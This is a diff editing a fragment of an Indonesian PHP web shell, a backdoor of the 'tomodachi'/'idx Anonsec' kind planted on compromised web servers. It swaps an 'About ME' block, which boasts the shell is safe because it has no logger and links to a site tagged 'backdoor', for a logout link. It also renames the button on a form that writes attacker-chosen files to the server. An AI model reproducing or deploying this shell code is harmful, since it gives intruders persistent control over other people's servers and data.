@@ -1142,19 +1142,16 @@ exit;
 	}
 	
 	echo "</div>";}
-	elseif ($_REQUEST['about'] == "tomodachi") {
+	elseif ($_REQUEST['Logout'] == "tomodachi") {
 		echo "<hr><center>About ME<br><br>";
-		echo "Recode Shell Dari idx Anonsec dan sedikit merubah tampilan<br>";
-		echo "Tanpa adanya logger, shell ini aman digunakan<br>";
-		echo "Tunggu shell versi terbarunya dari saya ";
-		echo "kunjungi website => <a class='button' href='http://www.opetmv.rf.gd/index.php?opet=backdoor' target='_blank'>Click</a></center><hr><br>";}
+		echo "<a class='button' href='/index.php' target='_blank'>Click LogOut This!</a><br>";}
 
 	elseif ($_REQUEST['buatfile'] == "tomodachi") {
 		echo "<center>
     <form method='POST'>
         <input type='text' class='form-control' value='$lokasi/filekamu.php' style='width: 400px;' name='nama_file' autocomplete='off' placeholder='Nama File...'><br><br/>
         <textarea name='isi_file' class='form-control' rows='15' cols='70' placeholder='Isi File...'></textarea><br/>
-        <button type='sumbit' class='button' name='bikin'>Bikin!!</button><br><br/>
+        <button type='sumbit' class='button' name='create'>Create</button><br><br/>
     </form></center>";
 
     if (isset($_POST['bikin'])) {
